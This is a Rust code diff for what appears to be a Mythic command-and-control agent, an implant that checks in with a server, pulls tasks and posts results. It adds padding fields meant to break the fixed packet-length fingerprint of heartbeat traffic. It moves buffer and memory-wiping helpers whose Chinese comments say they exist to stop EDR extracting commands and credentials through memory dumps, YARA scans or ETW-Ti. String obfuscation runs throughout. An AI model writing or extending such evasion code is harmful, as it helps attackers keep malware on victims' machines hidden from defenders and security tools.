@@ -2,9 +2,11 @@ extern crate alloc;
 
 use alloc::string::String;
 use alloc::vec::Vec;
-use core::mem::MaybeUninit;
 use serde::{Deserialize, Serialize};
-use crate::profiles::crypto::zeroize_slice;
+pub use crate::buffer::{
+    zeroize_slice, zeroize_string, StackArena, StackVec, StackWorkspace4K,
+    MAX_B64_LEN, MAX_PLAINTEXT_LEN, MAX_RAW_LEN, PROTOCOL_OVERHEAD,
+};
 
 // #![allow(unused)]
 
@@ -130,31 +132,6 @@ impl ModelError {
     }
 }
 
-// ==========================================
-// 内存安全与隐蔽性辅助工具函数
-// ==========================================
-
-/// 将 alloc::string::String 底层字节缓冲区原地刷零
-///
-/// 通信中，服务端返回的命令文本、参数及响应字段（如 command, parameters, error）
-/// 在离开作用域前必须被物理洗白，防止 EDR 通过 Process Minidump、PAGE_READWRITE 内存扫描或 YARA 规则检索提取敏感指令与通信凭据。
-/// 【内存安全修复】覆盖 String 的整个 capacity 堆缓冲区，彻底杜绝 spare capacity 泄露与 Heap Remanence
-#[inline(always)]
-pub fn zeroize_string(s: &mut String) {
-    let cap = s.capacity();
-    if cap > 0 {
-        // 【UB 修复与内存安全】Rust 内存模型严格要求：不能对包含未初始化内存的区域 (len..cap) 构造 &mut [T] 引用，
-        // 否则会立即违反引用有效性不变式 (Validity Invariant) 导致未定义行为 (Undefined Behavior, UB)。
-        // 故此处摒弃 core::slice::from_raw_parts_mut，改用裸指针 volatile 逐字节写入，
-        // 既安全覆盖包含 spare capacity 的整块堆内存，又杜绝任何未定义行为。
-        let ptr = s.as_mut_ptr();
-        for i in 0..cap {
-            unsafe {
-                core::ptr::write_volatile(ptr.add(i), 0);
-            }
-        }
-    }
-}
 
 // ==========================================
 // mythic协议请求数据结构 (Agent -> Mythic Server)
@@ -201,6 +178,9 @@ pub struct CheckinMessage<'a> {
     /// 进程权限级别 (如 3代表High/Admin, 4代表SYSTEM)
     #[serde(skip_serializing_if = "Option::is_none")]
     pub integrity_level: Option<u8>,
+    /// 动态混淆字段：使用 &'a str 零拷贝借用切片
+    #[serde(borrow, skip_serializing_if = "Option::is_none", default)]
+    pub _p: Option<&'a str>,
 }
 
 impl<'a> CheckinMessage<'a> {
@@ -230,7 +210,15 @@ impl<'a> CheckinMessage<'a> {
             domain,
             process_name: None,
             integrity_level: None,
+            _p: None,
         }
+    }
+
+    /// 注入动态混淆字段
+    #[inline]
+    pub fn with_padding(mut self, padding: Option<&'a str>) -> Self {
+        self._p = padding;
+        self
     }
 
     /// 链式追加进程名称与完整性级别信息 (零分配)
@@ -268,6 +256,9 @@ pub struct GetTaskingMessage<'a> {
     pub action: &'a str,
     /// 单次期望拉取的最大任务数量 (标准为 1)
     pub tasking_size: i32,
+    /// 动态混淆字段：打破空心跳的恒定包长指纹
+    #[serde(borrow, skip_serializing_if = "Option::is_none", default)]
+    pub _p: Option<&'a str>,
 }
 
 /// Default是core::default::Default提供的trait,定义了一个类型的默认标准初始值.后续可用 GetTaskingMessage::default()直接初始化
@@ -277,11 +268,18 @@ impl<'a> Default for GetTaskingMessage<'a> {
         Self {
             action: obfstr!("get_tasking"),
             tasking_size: 1,
+            _p: None,
         }
     }
 }
 
 impl<'a> GetTaskingMessage<'a> {
+    /// 注入动态混淆字段
+    #[inline]
+    pub fn with_padding(mut self, padding: Option<&'a str>) -> Self {
+        self._p = padding;
+        self
+    }
     pub fn validate(&self) -> Result<(), ModelError> {
         if self.action != obfstr!("get_tasking") {
             return Err(ModelError::InvalidAction);
@@ -395,6 +393,9 @@ pub struct PostResponseMessage<'a> {
     pub action: &'a str,
     /// 执行结果条目切片 (直接引用调用者栈帧上的临时数组)
     pub responses: &'a [TaskResponseItem<'a>],
+    /// 动态混淆字段：使任务回传数据包在边界内自然浮动
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub _p: Option<&'a str>,
 }
 
 impl<'a> PostResponseMessage<'a> {
@@ -403,7 +404,15 @@ impl<'a> PostResponseMessage<'a> {
         Self {
             action: obfstr!("post_response"),
             responses,
+            _p: None,
         }
+    }
+
+    /// 注入动态混淆字段
+    #[inline]
+    pub fn with_padding(mut self, padding: Option<&'a str>) -> Self {
+        self._p = padding;
+        self
     }
 
     pub fn validate(&self) -> Result<(), ModelError> {
@@ -425,7 +434,7 @@ impl<'a> PostResponseMessage<'a> {
 /// 服务端响应 Checkin 消息的结构 (Mythic Server -> Agent):服务端收到CheckinMessage 并成功注册上线会话后，若成功,返回包含 status: "success",且Agent 将使用其提供的 copy_id_to函数将新的 Callback UUID物理拷贝保存至栈/静态缓冲区中，用以取代初始的静态 Payload UUID
 ///
 /// 采用零拷贝切片借用 (`&'a str`)，直接引用解密明文暂存区（raw_buf），彻底杜绝在 Windows 10/11 Segment Heap 上进行微小高频堆分配（ETW-Ti 规避），
-/// 并防止明文字符串在堆释放后残留于空闲链表（Heap Remanence）。
+/// 并防止明文字符串在堆释放后残留于空闲链表（Heap Remanence）
 #[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
 #[cfg_attr(any(debug_assertions, test), derive(Debug))]
 pub struct ServerCheckinResponse<'a> {
@@ -574,301 +583,9 @@ impl Drop for ServerTaskingResponse {
 }
 
 // ==========================================
-// 栈上固定容量与大栈缓冲区模型 (Zero-Heap Stack Allocator Models)
-// 划拨连续栈切片并在擦除时将 Offset 清零，杜绝堆分配与 Heap Remanence
+// 栈上固定容量与大栈缓冲区模型 (已统一归口至 crate::buffer)
+// 详见 crate::buffer::StackVec 与 crate::buffer::StackArena
 // ==========================================
-
-/// 栈上固定容量向量 (Zero-Heap Stack Vector)
-///
-/// 彻底替换 `alloc::vec::Vec` 在零拷贝通信切片反序列化过程中的堆分配需求。
-/// 内部数据完全存在于栈帧内存中，提供与 Vec 兼容的切片操作接口与 Serde Deserialize 实现。
-pub struct StackVec<T, const N: usize> {
-    data: [MaybeUninit<T>; N],
-    len: usize,
-}
-
-impl<T, const N: usize> StackVec<T, N> {
-    #[inline(always)]
-    pub const fn new() -> Self {
-        Self {
-            // 【编译兼容性与内存安全强化】
-            // 采用与核心库 uninit_array 完全对齐的底层定长 MaybeUninit 数组初始化语义，
-            // 彻底杜绝 inline const 表达式引用外层泛型类型参数 T 时可能触发的 E0401 编译硬错误。
-            data: unsafe { MaybeUninit::<[MaybeUninit<T>; N]>::uninit().assume_init() },
-            len: 0,
-        }
-    }
-
-    #[inline]
-    pub fn push(&mut self, item: T) -> Result<(), T> {
-        if self.len < N {
-            self.data[self.len].write(item);
-            self.len += 1;
-            Ok(())
-        } else {
-            Err(item)
-        }
-    }
-
-    #[inline(always)]
-    pub fn len(&self) -> usize {
-        self.len
-    }
-
-    #[inline(always)]
-    pub fn is_empty(&self) -> bool {
-        self.len == 0
-    }
-
-    #[inline(always)]
-    pub fn capacity(&self) -> usize {
-        N
-    }
-
-    #[inline]
-    pub fn pop(&mut self) -> Option<T> {
-        if self.len > 0 {
-            self.len -= 1;
-            unsafe {
-                Some(self.data[self.len].assume_init_read())
-            }
-        } else {
-            None
-        }
-    }
-
-    #[inline]
-    pub fn clear(&mut self) {
-        while self.len > 0 {
-            self.len -= 1;
-            unsafe {
-                core::ptr::drop_in_place(self.data[self.len].as_mut_ptr());
-            }
-        }
-    }
-
-    #[inline(always)]
-    pub fn as_slice(&self) -> &[T] {
-        // 安全保证：0..self.len 范围内的元素均已通过 push 正确初始化
-        // 且 MaybeUninit<T> 与 T 具备严格一致的内存对齐、尺寸与布局保证
-        // 【Rust 1.90/1.91 稳定版兼容修复】
-        // MaybeUninit::slice_assume_init_ref 属于 nightly 实验性特性 (maybe_uninit_slice)，
-        // 在 stable 编译器下会触发编译硬错误 E0658。此处采用完全稳定的 core::slice::from_raw_parts 进行零成本安全转换。
-        unsafe {
-            core::slice::from_raw_parts(self.data.as_ptr().cast::<T>(), self.len)
-        }
-    }
-
-    #[inline(always)]
-    pub fn as_mut_slice(&mut self) -> &mut [T] {
-        // 【Rust 1.90/1.91 稳定版兼容修复】
-        // 采用 stable 兼容的 core::slice::from_raw_parts_mut 替代非稳定版 slice_assume_init_mut
-        unsafe {
-            core::slice::from_raw_parts_mut(self.data.as_mut_ptr().cast::<T>(), self.len)
-        }
-    }
-}
-
-impl<T: Clone, const N: usize> Clone for StackVec<T, N> {
-    fn clone(&self) -> Self {
-        let mut new_vec = Self::new();
-        for item in self.as_slice() {
-            let _ = new_vec.push(item.clone());
-        }
-        new_vec
-    }
-}
-
-// 【Rust 类型系统规则与编译错误 E0184 修复】
-// Rust 编译器明确禁止类型同时实现 Drop 和 Copy 特征 (the trait `Copy` may not be implemented for this type; the type has a destructor)。
-// StackVec 实现了用于安全析构元素的 Drop 特征，因此不能实现 Copy 特征；如需复制应统一调用 Clone 特征的 .clone()。
-
-impl<T: PartialEq, const N: usize> PartialEq for StackVec<T, N> {
-    fn eq(&self, other: &Self) -> bool {
-        self.as_slice() == other.as_slice()
-    }
-}
-
-impl<T: Eq, const N: usize> Eq for StackVec<T, N> {}
-
-impl<T: core::fmt::Debug, const N: usize> core::fmt::Debug for StackVec<T, N> {
-    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
-        self.as_slice().fmt(f)
-    }
-}
-
-impl<T, const N: usize> Drop for StackVec<T, N> {
-    fn drop(&mut self) {
-        // 遵循 Rust 析构标准：采用 LIFO 逆序析构，并在析构前递减长度，确保异常安全
-        self.clear();
-    }
-}
-
-impl<T, const N: usize> Extend<T> for StackVec<T, N> {
-    fn extend<I: IntoIterator<Item = T>>(&mut self, iter: I) {
-        for item in iter {
-            if self.push(item).is_err() {
-                break;
-            }
-        }
-    }
-}
-
-impl<T, const N: usize> Default for StackVec<T, N> {
-    fn default() -> Self {
-        Self::new()
-    }
-}
-
-impl<T, const N: usize> core::ops::Deref for StackVec<T, N> {
-    type Target = [T];
-    #[inline(always)]
-    fn deref(&self) -> &[T] {
-        self.as_slice()
-    }
-}
-
-impl<T, const N: usize> core::ops::DerefMut for StackVec<T, N> {
-    #[inline(always)]
-    fn deref_mut(&mut self) -> &mut [T] {
-        self.as_mut_slice()
-    }
-}
-
-impl<'a, T, const N: usize> IntoIterator for &'a StackVec<T, N> {
-    type Item = &'a T;
-    type IntoIter = core::slice::Iter<'a, T>;
-    #[inline(always)]
-    fn into_iter(self) -> Self::IntoIter {
-        self.as_slice().iter()
-    }
-}
-
-impl<'a, T, const N: usize> IntoIterator for &'a mut StackVec<T, N> {
-    type Item = &'a mut T;
-    type IntoIter = core::slice::IterMut<'a, T>;
-    #[inline(always)]
-    fn into_iter(self) -> Self::IntoIter {
-        self.as_mut_slice().iter_mut()
-    }
-}
-
-// 抽取 Visitor 至模块作用域，彻底消除在函数内部重新声明同名泛型参数导致的泛型参数遮蔽 (Generic Parameter Shadowing) 警告与生命周期解析歧义
-struct StackVecVisitor<T, const N: usize>(core::marker::PhantomData<fn() -> T>);
-
-impl<'de, T: Deserialize<'de>, const N: usize> serde::de::Visitor<'de> for StackVecVisitor<T, N> {
-    type Value = StackVec<T, N>;
-
-    fn expecting(&self, formatter: &mut core::fmt::Formatter) -> core::fmt::Result {
-        write!(formatter, "a sequence of up to {} elements", N)
-    }
-
-    fn visit_seq<A>(self, mut seq: A) -> Result<Self::Value, A::Error>
-    where
-        A: serde::de::SeqAccess<'de>,
-    {
-        let mut vec = StackVec::new();
-        while let Some(element) = seq.next_element()? {
-            if vec.push(element).is_err() {
-                while let Some(_) = seq.next_element::<serde::de::IgnoredAny>()? {}
-                break;
-            }
-        }
-        Ok(vec)
-    }
-}
-
-impl<'de, T: Deserialize<'de>, const N: usize> Deserialize<'de> for StackVec<T, N> {
-    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
-    where
-        D: serde::Deserializer<'de>,
-    {
-        deserializer.deserialize_seq(StackVecVisitor::<T, N>(core::marker::PhantomData))
-    }
-}
-
-impl<T: Serialize, const N: usize> Serialize for StackVec<T, N> {
-    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
-    where
-        S: serde::Serializer,
-    {
-        self.as_slice().serialize(serializer)
-    }
-}
-
-/// 预先分配的大栈缓冲区 (Stack Arena Buffer)
-///
-/// 从栈内存中划出连续字节切片，擦除时直接把 Offset 清零，杜绝所有堆分配与 Heap Remanence。
-pub struct StackArena<const CAP: usize> {
-    buf: [u8; CAP],
-    offset: usize,
-}
-
-impl<const CAP: usize> StackArena<CAP> {
-    #[inline(always)]
-    pub const fn new() -> Self {
-        Self {
-            buf: [0u8; CAP],
-            offset: 0,
-        }
-    }
-
-    #[inline]
-    pub fn alloc_slice(&mut self, len: usize) -> Option<&mut [u8]> {
-        if self.offset.saturating_add(len) > CAP {
-            return None;
-        }
-        let start = self.offset;
-        let end = start + len;
-        self.offset = end;
-        Some(&mut self.buf[start..end])
-    }
-
-    #[inline(always)]
-    pub fn used_slice(&self) -> &[u8] {
-        &self.buf[..self.offset]
-    }
-
-    #[inline(always)]
-    pub fn used_slice_mut(&mut self) -> &mut [u8] {
-        let off = self.offset;
-        &mut self.buf[..off]
-    }
-
-    #[inline(always)]
-    pub fn offset(&self) -> usize {
-        self.offset
-    }
-
-    #[inline(always)]
-    pub fn remaining(&self) -> usize {
-        CAP.saturating_sub(self.offset)
-    }
-
-    #[inline(always)]
-    pub fn zeroize_and_reset(&mut self) {
-        if self.offset > 0 {
-            zeroize_slice(&mut self.buf[..self.offset]);
-            self.offset = 0;
-        }
-    }
-}
-
-impl<const CAP: usize> Drop for StackArena<CAP> {
-    fn drop(&mut self) {
-        // 【防御性擦除强化】在 Drop 阶段全量刷零整个底层 buf 数组，而不仅仅是 0..offset，
-        // 杜绝任何被重置或未被 offset 覆盖的历史临时数据在栈帧销毁后残留在栈内存中
-        zeroize_slice(&mut self.buf);
-        self.offset = 0;
-    }
-}
-
-impl<const CAP: usize> Default for StackArena<CAP> {
-    #[inline(always)]
-    fn default() -> Self {
-        Self::new()
-    }
-}
 
 // ==========================================
 // 零拷贝任务借用模型 (Zero-Copy Borrowed Task Models)
